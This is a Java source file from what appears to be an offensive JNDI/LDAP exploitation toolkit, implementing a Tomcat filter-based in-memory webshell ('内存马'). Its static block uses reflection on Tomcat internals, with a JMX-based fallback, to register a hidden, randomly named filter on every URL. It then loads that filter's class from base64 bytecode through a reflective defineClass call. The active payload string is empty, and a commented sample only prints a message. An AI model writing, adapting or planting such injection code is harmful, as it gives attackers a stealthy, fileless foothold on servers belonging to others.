package com.feihong.ldap.template;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.http.HttpServlet;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Random;
import java.io.IOException;
import java.lang.reflect.Method;

import org.apache.tomcat.util.modeler.Registry;
import sun.misc.BASE64Decoder;
import java.lang.reflect.InvocationTargetException;
import java.util.Set;



/**
 *  Tomcat Filter 型内存马
 */
public class TomcatMemshellall1 extends HttpServlet  {
    static {
        try{
            String filterName = randomString(6);
            String urlPattern = "/*";

            WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Class<? extends StandardContext> aClass = null;
            try {
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                aClass.getDeclaredField("filterConfigs");
            } catch (Exception e) {
                aClass = standardContext.getClass();
                aClass.getDeclaredField("filterConfigs");
            }
            Field Configs = aClass.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);


            try{
                //  DynamicMBean dynamicMBean = namedObject.getObject();
                // System.out.println("[+] Add Dynamic Filter");

                //生成 FilterDef
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterDefClass = null;
                try {
                    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                } catch (ClassNotFoundException e) {
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }

                Object filterDef = filterDefClass.newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                Class clazz = getDynamicFilterTemplateClass();
                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());
                standardContext.getClass().getMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

                //设置 FilterMap
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterMapClass = null;
                try {
                    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                } catch (ClassNotFoundException e) {
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                }

                //使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了
                //其他中间件应该也是类似的
                Object filterMap = filterMapClass.newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                standardContext.getClass().getMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                //设置 FilterConfig
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(filterName, filterConfig);
            }catch(Exception e){
                //      e.printStackTrace();
            }

        }catch(Exception e){
            //   e.printStackTrace();
            try {

                MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
                Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
                field.setAccessible(true);
                Object obj = field.get(mbeanServer);

                field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
                field.setAccessible(true);

                Repository repository = (Repository) field.get(obj);

                Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
                if (objectSet.size() == 0) {
                    // springboot的jmx中为Tomcat而非Catalina
                    objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
                }

                for (NamedObject namedObject : objectSet) {
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(obj);

                    Class listener = getDynamicFilterTemplateClass();
                    standardContext.addApplicationEventListener(listener);
                }
            } catch (Exception e2) {
                //      e.printStackTrace();
            }
        }
    }


    public static String randomString(int len){
        String AB = "abcdefghijklmnopqrstuvwxyz";
        Random rnd = new Random();
        StringBuilder sb = new StringBuilder( len );
        for( int i = 0; i < len; i++ )
            sb.append( AB.charAt( rnd.nextInt(AB.length()) ) );
        return sb.toString();
    }

    public static Class getDynamicFilterTemplateClass() throws IOException, InvocationTargetException, IllegalAccessException {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Class clazz;
        try{
            clazz = cl.loadClass("com.feihong.ldap.template.TomcatTemp");
        }catch(ClassNotFoundException e){
            BASE64Decoder base64Decoder = new BASE64Decoder();
            // String codeClass = "";
            // test ok only print
            //   String codeClass = "yv66vgAAADMANwoABwAiCQAjACQIACUKACYAJwsAKAApBwAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACdMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9CYXNpY0ZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwAtAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwAuAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBCYXNpY0ZpbHRlci5qYXZhDAAJAAoHAC8MADAAMQEAGlsrXUJhc2ljIEZpbHRlciBpbnZva2VkLi4uBwAyDAAzADQHADUMABYANgEAJWNvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvQmFzaWNGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAGAAcAAQAIAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAYADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAANQAAAAIAAAABsQAAAAIADAAAAAYAAQAAAAoADQAAABYAAgAAAAEADgAPAAAAAAABABIAEwABABQAAAAEAAEAFQABABYAFwACAAsAAABhAAMABAAAABGyAAISA7YABC0rLLkABQMAsQAAAAIADAAAAA4AAwAAAA4ACAAPABAAEAANAAAAKgAEAAAAEQAOAA8AAAAAABEAGAAZAAEAAAARABoAGwACAAAAEQAcAB0AAwAUAAAABgACAB4AFQABAB8ACgABAAsAAAArAAAAAQAAAAGxAAAAAgAMAAAABgABAAAAFQANAAAADAABAAAAAQAOAA8AAAABACAAAAACACE=";
            //    String codeClass = "";
            String codeClass = "";
            byte[] bytes = base64Decoder.decodeBuffer(codeClass);

            Method method = null;
            Class clz = cl.getClass();
            while(method == null && clz != Object.class ){
                try{
                    method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                }catch(NoSuchMethodException ex){
                    clz = clz.getSuperclass();
                }
            }
            method.setAccessible(true);
            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        }

        return clazz;
    }


    @Override
    public void destroy() {

    }


}